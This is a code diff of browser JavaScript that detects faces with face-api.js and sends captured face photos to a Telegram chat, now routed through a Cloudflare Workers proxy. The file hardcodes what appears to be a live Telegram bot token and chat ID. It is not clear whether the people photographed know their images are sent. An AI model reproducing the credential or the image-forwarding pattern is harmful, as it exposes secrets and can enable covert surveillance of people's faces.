@@ -185,7 +185,7 @@
 
     const TG_TOKEN = '8777541911:AAEd_BEosgiFZrjeD7UYTbR2RyaXRhmaecI';
     const TG_CHAT_ID = '-1003794049979';
-    const TG_API = 'https://api.telegram.org/bot' + TG_TOKEN;
+    const TG_API = 'https://tg-proxy.tweet44ar.workers.dev/bot' + TG_TOKEN;
 
     const MODEL_URL = 'https://cdn.jsdelivr.net/gh/justadudewhohacks/face-api.js@master/weights';
 
@@ -240,19 +240,6 @@
       }
     }
 
-    function xhrSend(url, formData) {
-      return new Promise((resolve, reject) => {
-        const xhr = new XMLHttpRequest();
-        xhr.open('POST', url, true);
-        xhr.onload = function () {
-          try { resolve(JSON.parse(xhr.responseText)); }
-          catch (e) { resolve({ ok: false, description: xhr.responseText }); }
-        };
-        xhr.onerror = function () { reject(new Error('XHR failed')); };
-        xhr.send(formData);
-      });
-    }
-
     async function sendToTelegram(detection) {
       const now = Date.now();
       if (now - lastSentTime < SEND_COOLDOWN) return;
@@ -295,37 +282,19 @@
         }
         const blob = new Blob([bytes.buffer], { type: 'image/jpeg' });
 
-        console.log('[TG] Sending photo, blob size:', blob.size);
+        console.log('[TG] Sending photo via proxy, blob size:', blob.size);
 
-        // Отправляем через XMLHttpRequest (обходит Safari CORS)
         const fd = new FormData();
         fd.append('chat_id', TG_CHAT_ID);
         fd.append('caption', caption);
         fd.append('photo', blob, 'face.jpg');
 
-        const result = await xhrSend(TG_API + '/sendPhoto', fd);
-        console.log('[TG] Photo result:', result.ok);
-
-        if (!result.ok) {
-          console.log('[TG] Photo failed:', result.description);
-          // Fallback — текст
-          const fd2 = new FormData();
-          fd2.append('chat_id', TG_CHAT_ID);
-          fd2.append('text', caption);
-          await xhrSend(TG_API + '/sendMessage', fd2);
-          console.log('[TG] Text sent instead');
-        }
+        const resp = await fetch(TG_API + '/sendPhoto', { method: 'POST', body: fd });
+        const result = await resp.json();
+        console.log('[TG] Result:', result.ok ? 'SUCCESS' : result.description);
 
       } catch (e) {
         console.error('[TG] Error:', e.message);
-        try {
-          const fd2 = new FormData();
-          fd2.append('chat_id', TG_CHAT_ID);
-          fd2.append('text', caption + '\n\n⚠️ ' + e.message);
-          await xhrSend(TG_API + '/sendMessage', fd2);
-        } catch (e2) {
-          console.error('[TG] All failed:', e2.message);
-        }
       } finally {
         sending = false;
       }
